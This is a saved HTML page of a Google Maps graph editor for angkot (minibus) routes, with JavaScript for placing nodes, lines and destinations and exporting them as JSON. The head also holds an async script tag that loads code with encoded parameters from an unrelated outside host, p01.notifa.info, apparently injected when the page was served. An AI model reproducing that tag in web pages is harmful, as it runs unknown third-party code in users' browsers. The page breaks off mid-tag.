<html><head><style>.gm-control-active>img{box-sizing:content-box;display:none;left:50%;pointer-events:none;position:absolute;top:50%;transform:translate(-50%,-50%)}.gm-control-active>img:nth-child(1){display:block}.gm-control-active:hover>img:nth-child(1),.gm-control-active:active>img:nth-child(1){display:none}.gm-control-active:hover>img:nth-child(2),.gm-control-active:active>img:nth-child(3){display:block}
</style><link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Google+Sans"><style>.gm-ui-hover-effect{opacity:.6}.gm-ui-hover-effect:hover{opacity:1}
</style><style>.gm-style .gm-style-cc span,.gm-style .gm-style-cc a,.gm-style .gm-style-mtc div{font-size:10px;box-sizing:border-box}
</style><style>@media print {  .gm-style .gmnoprint, .gmnoprint {    display:none  }}@media screen {  .gm-style .gmnoscreen, .gmnoscreen {    display:none  }}</style><style>.dismissButton{background-color:#fff;border:1px solid #dadce0;color:#1a73e8;border-radius:4px;font-family:Roboto,sans-serif;font-size:14px;height:36px;cursor:pointer;padding:0 24px}.dismissButton:hover{background-color:rgba(66,133,244,0.04);border:1px solid #d2e3fc}.dismissButton:focus{background-color:rgba(66,133,244,0.12);border:1px solid #d2e3fc;outline:0}.dismissButton:hover:focus{background-color:rgba(66,133,244,0.16);border:1px solid #d2e2fd}.dismissButton:active{background-color:rgba(66,133,244,0.16);border:1px solid #d2e2fd;box-shadow:0 1px 2px 0 rgba(60,64,67,0.3),0 1px 3px 1px rgba(60,64,67,0.15)}.dismissButton:disabled{background-color:#fff;border:1px solid #f1f3f4;color:#3c4043}
</style><style>.gm-style-pbc{transition:opacity ease-in-out;background-color:rgba(0,0,0,0.45);text-align:center}.gm-style-pbt{font-size:22px;color:white;font-family:Roboto,Arial,sans-serif;position:relative;margin:0;top:50%;-webkit-transform:translateY(-50%);-ms-transform:translateY(-50%);transform:translateY(-50%)}
</style><style>.gm-style img{max-width: none;}.gm-style {font: 400 11px Roboto, Arial, sans-serif; text-decoration: none;}</style>
    <title>Simple Map</title>
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
    <meta charset="utf-8">
    <style>
      html, body, #map-canvas {
		width: 80%;
        height: 90%;
        //margin: 0px;
        //padding: 0px
      }
	  a{
		cursor: pointer;
		text-decoration: underline;
	  }
    </style>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp"></script>
    <script>
	var map;
	var __global_node_now			= 'null';
	var __global_node 				= false;
	var __global_line 				= false;
	var __global_destination		= false;
	var __global_destination_now	= 'null';
	var __global_load_json			= false;
	var __global_load_route			= false;
	var __global_arr_node			= new Array();
	var __global_first_line			= 0;

	function add_node(){

		var active_x = document.getElementById('add_nodex');
		var active_y = document.getElementById('add_linex').innerHTML = 'Add Line';
		var active_z = document.getElementById('add_destinationx').innerHTML = 'Add Destination';
		
		/* disable other tools */
		__global_line		 	= false;
		__global_destination 	= false;
			
		if(__global_node == false){
			__global_node	= true;
			active_x.innerHTML = 'Add Node [x]';
					
		}else{
			__global_node 	= false;
			active_x.innerHTML = 'Add Node';
			
		}
	}

	function add_line(){
		
		var active_x = document.getElementById('add_nodex').innerHTML = 'Add Node';
		var active_y = document.getElementById('add_linex');
		var active_z = document.getElementById('add_destinationx').innerHTML = 'Add Destination';
		
		/* disable other tools */
		__global_node 			= false;
		__global_destination	= false;
			
		if(__global_line == false){
			__global_line	= true;
			active_y.innerHTML = 'Add Line [x]';
			
		}else{
			__global_line 	= false;
			active_y.innerHTML = 'Add Line';
			
		}	
	}

	function add_destination(){
		var active_x = document.getElementById('add_nodex').innerHTML = 'Add Node';
		var active_y = document.getElementById('add_linex').innerHTML = 'Add Line';		
		var active_z = document.getElementById('add_destinationx');
		
		/* disable other tools */
		__global_node 	= false;
		__global_line 	= false;
			
		if(__global_destination == false){
			__global_destination	= true;
			active_z.innerHTML = 'Add Destination [x]';
			
		}else{
			__global_destination 	= false;
			active_z.innerHTML = 'Add Destination';
			
		}		
	}
	
	function load_markerlinex(){
		
		div_textarea = document.getElementById('load_json');		
		
		if( __global_load_json == false ){
			__global_load_json = true;

			div_textarea.style.display = 'inline-block';
		}else{
			__global_load_json = false;
			div_textarea.style.display = 'none';
		}
	}

	function add_route(){
		
		div_textarea = document.getElementById('insert_route');		
		
		if( __global_load_route == false ){
			__global_load_route = true;

			div_textarea.style.display = 'inline-block';
		}else{
			__global_load_route = false;
			div_textarea.style.display = 'none';
		}
	}
	
	function edit_destination_name(a, thiis){
		var edit_destination = prompt("Edit destination", $(thiis).html());
		console.log(window['marker_dest_' + a]);
		
		// id marker_destintation
		marker_destination = window['marker_dest_' + a];
		
		// update event popup
		if(edit_destination)
		{
			// update destination_name by live
			$(thiis).html(edit_destination);
			
			// update title marker
			marker_destination.setTitle(edit_destination);
			console.log(marker_destination.title);
			
			// remove previously event
			google.maps.event.clearListeners(marker_destination, 'click');
			
			// popup event
			var content = "<span class='destination_name' onclick='edit_destination_name(\"" + a + "\", this)'>" + edit_destination + "</span>";
			var infowindow = new google.maps.InfoWindow();			
			google.maps.event.addListener(marker_destination,'click', (function(marker_destination,content,infowindow){ 
				return function() {
					infowindow.setContent(content);
					//console.log(infowindow.getMap());
					infowindow.open(map,marker_destination);
				};
			})(marker_destination,content,infowindow)); 
		}
	}
	
	var poly;
	var map;
	var increase = 0;

	function initialize() {
		
		/* setup map */
		var mapOptions = {
			zoom: 13,
			center: new google.maps.LatLng(-6.2858667, 106.8719382)
		};
		map = new google.maps.Map(document.getElementById('map-canvas'),
		  mapOptions);

		/* setup polyline */
		var polyOptions = {
			geodesic: true,
			strokeColor: 'rgb(20, 120, 218)',
			strokeOpacity: 1.0,
			strokeWeight: 2,
			editable: true,
		};
		window['poly' + increase] = new google.maps.Polyline(polyOptions);
		window['poly' + increase].setMap(map);
	  
	  
		/* create marker and line by click */
		google.maps.event.addListener(map, 'click', function(event) 
		{		
			/* if tools 'add destination' is active, create marker */
			if( __global_destination == true ){
				var key_destination = 0;
				//__global_destination_now = 'a';
				
				if( __global_destination_now == 'null' ){
					__global_destination_now = 'a';
					key_destination	= 0;
				}else{
					__global_destination_now = String.fromCharCode( __global_destination_now.charCodeAt(0) + 1 );
					key_destination += 1;
				}
				console.log(__global_destination_now);
				// nama destination
				destination_name = "HAE";
				window['infowindow'+key_destination] = new google.maps.InfoWindow({
					content: '<div>'+ destination_name +'</div>'
				});
								
				// add marker destination
				icons = 'http://maps.google.com/mapfiles/ms/icons/green-dot.png';
				var location = event.latLng;
				window['marker_dest_' + __global_destination_now] = new google.maps.Marker({
					position: location,
					map: map,
					icon: icons,
					draggable: true,
					title: '' + __global_destination_now,
				});
				
				// id marker_destintation
				var marker_destintation = window['marker_dest_' + __global_destination_now];
				
				// popup event
				var content = "<span class='destination_name' onclick='edit_destination_name(\"" + __global_destination_now + "\", this)'>" + __global_destination_now + "</span>";
				var infowindow = new google.maps.InfoWindow();			
				google.maps.event.addListener(marker_destintation,'click', (function(marker_destintation,content,infowindow){ 
					return function() {
						infowindow.setContent(content);
						infowindow.open(map,marker_destintation);
					};
				})(marker_destintation,content,infowindow)); 		
			}
			
			/* if tools 'add node' is active, create marker */
			if( __global_node == true )
			{
				if( __global_node_now == 'null' )
					__global_node_now = 0;
				else
					__global_node_now += 1;
				
				/* draw a new marker */
				var location = event.latLng;
				var marker = new google.maps.Marker({
					position: location,
					map: map,
					title: '' + __global_node_now,
				});

				// popup event
				var content_marker = "<div>" + __global_node_now + "</div>";
				var infowindow_marker = new google.maps.InfoWindow();			
				google.maps.event.addListener(marker,'click', (function(marker,content_marker,infowindow_marker){ 
					return function() {
						infowindow_marker.setContent(content_marker);
						infowindow_marker.open(map,marker);
					};
				})(marker,content_marker,infowindow_marker)); 
				
				/* Add listener to getting latLng marker 
				* using 'list object event' : {this.title, this.position}
				*/
				google.maps.event.addListener(marker, "click", function (evt) 
				{
					/* if tools 'add line' is active, create first polyline */
					if( __global_line == true ){
						
						/* first polyline */
						var path = window['poly' + increase].getPath();
						path.push(event.latLng);
						
						/* temporary for node start - finish for json
						* example : 0-1 {"coordinates": [[123, 456], [321, 123]]}
						*/
						if( __global_first_line == 0 )
							temp_node1 = this.title;

						
						/* jika meng-klik ke marker/node akhir dalam pembuatan polyline */
						if( evt.latLng.lat() == event.latLng.lat() && evt.latLng.lng() == event.latLng.lng() && __global_first_line == 1 ){
							
							alert('node & line berhasil disambung!');
							
							temp_node2		= this.title;
							temp_node_fix 	= temp_node1 + '-' + temp_node2;
							__global_arr_node.push(temp_node_fix);
						
							/* adding id window['poly' + increase] */
							increase += 1;
							
							/* reset first polyline */
							__global_first_line = 0;
							
							
							/* reset polyline */
							var polyOptions = {
								geodesic: true,
								strokeColor: 'rgb(20, 120, 218)',
								strokeOpacity: 1.0,
								strokeWeight: 2,
								editable: true,
								//draggable: true,
							};						
							window['poly' + increase] = new google.maps.Polyline(polyOptions);
							window['poly' + increase].setMap(map);

							return false; // die()
						}			

						__global_first_line = 1;
						
					}
				}); //end addListener	
	  
			}else if( __global_line == true ){
				
				if( __global_first_line == 1 ){

						var path = window['poly' + increase].getPath();
						path.push(event.latLng);			

				}else{
					alert('klik Node dulu!');
				}
			}
		});	// end click map
	}

	function save_markerlinex(){
		//console.log($('#text_route').val());
		//return false;
		var json_google_map = '';
		for( i = 0; i < increase; i++ )
		{
			// val_latlng 		= window['poly' + i].getPath().j;
			// length_latlng 	= window['poly' + i].getPath().j.length;

			val_latlng 		= window['poly' + i].getPath().getArray(); // new
			length_latlng 	= window['poly' + i].getPath().length; // new			

			var str2 = '';
			var polylineLength = 0;
			
			for( a = 0; a < length_latlng; a++ )
			{
				lat1	= val_latlng[a].lat();
				lng2	= val_latlng[a].lng();
	
				/* calculate distance polyline */
				if ( a < (length_latlng - 1) ) {
					
					next_lat1 		= val_latlng[(a+1)].lat();
					next_lng2		= val_latlng[(a+1)].lng();		

					var pointPath1 = new google.maps.LatLng(lat1, lng2);
					var pointPath2 = new google.maps.LatLng(next_lat1, next_lng2);				

					polylineLength += google.maps.geometry.spherical.computeDistanceBetween(pointPath1, pointPath2);
				}
				
				bracket_latlng 	= '[' + lat1 + ', ' + lng2 + ']';
				console.log("bracket : " + bracket_latlng);
				if( a == (length_latlng - 1) ){ // end
					str2 += bracket_latlng;
				}else{
					str2 += bracket_latlng + ',';
				}
			}
			
			nodes_info		= __global_arr_node[i];
			create_json 	= '{"nodes": ["' + nodes_info + '"], "coordinates": [' + str2 + '], "distance_metres": [' + polylineLength + ']}';
			//console.log("str2 : " + str2);
			
			/* reverse coordinates */
			str3_reverse	= '[' + str2 + ']';
			console.log(str3_reverse);
			str3_reverse_p	= JSON.parse(str3_reverse);
			str3			= '';
			for( u = (str3_reverse_p.length - 1); u >= 0; u-- )
			{				
				// rev = reverse
				latlng_rev	= str3_reverse_p[u];
				
				bracket_latlng_rev = '[' + latlng_rev + ']';
				if( u == 0 ){ // end
					str3 += bracket_latlng_rev;
				}else{
					str3 += bracket_latlng_rev + ',';
				}				
			}
			explode 		= nodes_info.split('-');
			nodes_info_rev 	= explode[1] + '-' + explode[0];
			create_json_rev = '{"nodes": ["' + nodes_info_rev + '"], "coordinates": [' + str3 + '], "distance_metres": [' + polylineLength + ']}';
			
			if( i == ( increase - 1 ) )
				pemisah = '\n\n=====================================\n\n';
			else
				pemisah = '\n\n-------------------------------------\n\n';
			
			json_google_map += create_json + '\n\n' + create_json_rev + pemisah;
		}
		

		// list marker destination
		if( __global_destination_now != 'null' ){
			
			number_dest = ( __global_destination_now.charCodeAt(0) - 97 );
			
			str4		= '';
			coord_dest 	= '';
			for( y = 0; y <= number_dest; y++ ){
				
				var chr = String.fromCharCode(97 + y);
				var title_live = window['marker_dest_' + chr].getTitle();
				console.log(window['marker_dest_' + chr].position);
				
				latsx = window['marker_dest_' + chr].position.lat();
				lngsx = window['marker_dest_' + chr].position.lng();
				
				if( y == number_dest ) // end
					comma = '';
				else
					comma = ',';
				
				coord_dest += '{"' + title_live + '": "' + latsx + ', ' + lngsx + '"}' + comma;
			}
			
			str4 = '{"destination": [' + coord_dest + ']}';

			json_google_map += str4;			
		}

		//document.getElementById('txt').innerHTML = json_google_map;
		rute_angkot = $('#text_route').val();

		//kalo belum buat graph
		if(json_google_map == '' || rute_angkot == ''){
			alert('buat graph dulu!');
			return false;
		}

		//console.log(rute_angkot);
		$.ajax({
			method:"POST",
			url : "json_to_sql.php",
			data: {
					json_google_map: json_google_map, 
					route_angkot: rute_angkot
				},
			success:function(url){
				window.location = 'download_sql.php?r=' + url;
			},
			error:function(er){
				alert('error: '+er);
				
				// remove loading
				$('#run_dijkstra').show();
				$('#loading').hide();
			}
		});	
	}

	
	function load_json(){
		textarea 	= document.getElementById('text_json');
		val			= textarea.value;
		
		if( val.trim() == '' ){
			return false;
		}
		
		var res		= val.split('-------------------------------------');
		
		for( i = 0; i < res.length; i++ ){
			
			var res1	= res[i].trim();
			var res2	= res1.split('\n');
			
			if( res2.length > 1 ){ // coordinates is exist
				var json	= JSON.parse(res2[0]);
				
				var nodes	= json.nodes.toString();
				var coord	= json.coordinates;

				for( a = 0; a < coord.length; a++ ){
					
					latlngs = coord[a].toString();
					splits	= latlngs.split(',');
					
					lats 	= splits[0].trim();
					lngs 	= splits[1].trim();
					
					var pointPoly = new google.maps.LatLng(lats, lngs);
					
					/* first polyline */
					var path = window['poly' + increase].getPath();
					path.push(pointPoly);

				
					/* draw a new marker */
					if( a == 0 || a == (coord.length - 1) ){
						
						var str_split = nodes.split('-');						
						
						if( a == 0 )
							nodes_target = str_split[0];
						else if( a == (coord.length - 1) )
							nodes_target = str_split[1];
						
						var location = pointPoly;
						var marker = new google.maps.Marker({
							position: location,
							map: map,
							title: '' + nodes_target,
						});
					}					
				}

					
				increase += 1;
				__global_arr_node.push(nodes);
				
				/* reset polyline */
				var polyOptions = {
					geodesic: true,
					strokeColor: 'rgb(20, 120, 218)',
					strokeOpacity: 1.0,
					strokeWeight: 2,
					editable: true,
				};						
				console.log( 'ulang' );
				window['poly' + increase] = new google.maps.Polyline(polyOptions);
				window['poly' + increase].setMap(map);

			}

		}
			
		var res1 = val.split('=====================================');
		
		if( res1.length > 1 ){
			
			res_dest 	= res1[1].trim();
			json		= JSON.parse(res_dest);
			json_root	= json.destination;
			length_json	= json.destination.length;
			
			for( b = 0; b < length_json; b++ ){
				
				var chr = String.fromCharCode(97 + b);
				__global_destination_now = chr;
				
				latlng1	= json_root[b][chr].toString().split(',');

				next_lat1 	= latlng1[0].trim();
				next_lng2	= latlng1[1].trim();			

				var pointPath1 = new google.maps.LatLng(next_lat1, next_lng2);
					
				icons = 'http://maps.google.com/mapfiles/ms/icons/green-dot.png';
				var location = event.latLng;
				window['marker_dest_' + __global_destination_now] = new google.maps.Marker({
					position: pointPath1,
					map: map,
					icon: icons,
					draggable: true,
					title: '' + __global_destination_now,
				});
				
			}
		}

		// reset
		textarea.value = '';
	}	
	
	/* load google maps v3 */
	google.maps.event.addDomListener(window, 'load', initialize);
    </script>
  <script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2P3rwmBwAPmusnkdF4lCd8qkJTngEnANDXr0zc3PgEU5RF%2ftkB0oU5VA55kDnz42eF9wmGXvVZL1qT0h4eH8KCi1lyVl3fL%2bQ4RSzaP8LVfEpF%2bzsTIMxvJ7hp0cl8X4zUKwuUpZ4eu%2bGyg32rF5zy%2fjp5lN4iYpwgagzes5OcinF5L7nYnNcwzCG8lqbp117gwkcE%2f6UF%2bgZPB5y1NGXa1a7bCa1fZ7j9XYOoEOpRkkOhwOLr6bzO0pJ6vT20YU6EKCFTHxw0IiTRx2DFTVAIoQ3LUPJb9s1V4NgCKDyXNN2wGLDkZ%2fFjUypqsdfFPj0XyXNPoZgG%2bjlJIBqi7mpKvUq%2fBFssw96ohWEY32JBupjnbM5tvhytUVNXpStTpxMglCW%2fAyTl8ZFYV%2fqy5jJlufcSaB30LgGeKvOKOOldI3Nv1k3RdZoJnzEEN1aFunlOIZT8EmMlXCifsFJCcqq08H0gIOrnk%2fEDJjJx%2foagIA8Wyc6eOjdmODJcYC7PRxywG1xkpQ3tf%2fDb9gtXJYGrDWJdjWHmbirb3q3FQrTmTQ%3d&amp;idc_r=46326643138&amp;domain=graph.latcoding.com&amp;sw=1366&amp;sh=768"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/common.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/util.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/map.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/geometry.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/poly.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/controls.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/5/onion.js"></script></head>
  <body>
<h1><b font="center">YUSRIL IZZHA PRATAMA</b></h1><pre>
<h1><b>NO:180403010019</b></h1>

    <div id="map-canvas" style="float: left; position: relative; overflow: hidden;"><div style="height: 100%; width: 100%; position: absolute; top: 0px; left: 0px; background-color: rgb(229, 227, 223);"><div class="gm-style" style="position: absolute; z-index: 0; left: 0px; top: 0px; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px;"><div tabindex="0" style="position: absolute; z-index: 0; left: 0px; top: 0px; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px; cursor: url(&quot;https://maps.gstatic.com/mapfiles/closedhand_8_8.cur&quot;), move; touch-action: none;"><div style="z-index: 1; position: absolute; left: 50%; top: 50%; width: 100%; transform: translate(-96px, 27px); will-change: transform;"><div style="position: absolute; left: 0px; top: 0px; z-index: 100; width: 100%;"><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"><div style="position: absolute; z-index: 987; transform: matrix(1, 0, 0, 1, -225, -246);"><div style="position: absolute; left: 256px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 0px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 256px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 512px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 512px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 512px; top: 256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 256px; top: 256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 0px; top: 256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -256px; top: 256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -256px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -256px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div></div></div></div><div style="position: absolute; left: 0px; top: 0px; z-index: 101; width: 100%;"><div style="position: absolute; left: 0px; top: 0px; z-index: 30;"><div style="position: absolute; z-index: 987; transform: matrix(1, 0, 0, 1, -225, -246); will-change: transform;"><div style="width: 256px; height: 256px; position: absolute; left: 256px; top: 0px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 0px; top: 0px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 0px; top: -256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 256px; top: -256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 512px; top: -256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 512px; top: 0px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 512px; top: 256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 256px; top: 256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 0px; top: 256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -256px; top: 256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -256px; top: 0px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -256px; top: -256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 0px; top: -512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 256px; top: -512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 512px; top: -512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -256px; top: -512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 256px; top: 512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 0px; top: 512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -256px; top: 512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 512px; top: 512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 768px; top: 0px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 768px; top: 256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 768px; top: 512px;"></div><div style="width: 256px; height: 256px; position: absolute; left: 768px; top: -256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -512px; top: 256px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -512px; top: 0px;"></div><div style="width: 256px; height: 256px; position: absolute; left: -512px; top: -256px;"></div></div></div></div><div style="position: absolute; left: 0px; top: 0px; z-index: 102; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 103; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"><div style="position: absolute; z-index: 987; transform: matrix(1, 0, 0, 1, -225, -246); will-change: transform;"><div style="position: absolute; left: 256px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6528!3i4239!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=40952" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6527!3i4239!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=112596" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 0px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6527!3i4238!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=33497" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 256px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6528!3i4238!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=92924" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6529!3i4238!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=21280" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6529!3i4239!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=100379" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: 256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6529!3i4240!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=98961" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 256px; top: 256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6528!3i4240!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=39534" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 0px; top: 256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6527!3i4240!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=111178" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: 256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6526!3i4240!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=51751" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6526!3i4239!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=53169" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6526!3i4238!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=105141" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 0px; top: -512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" 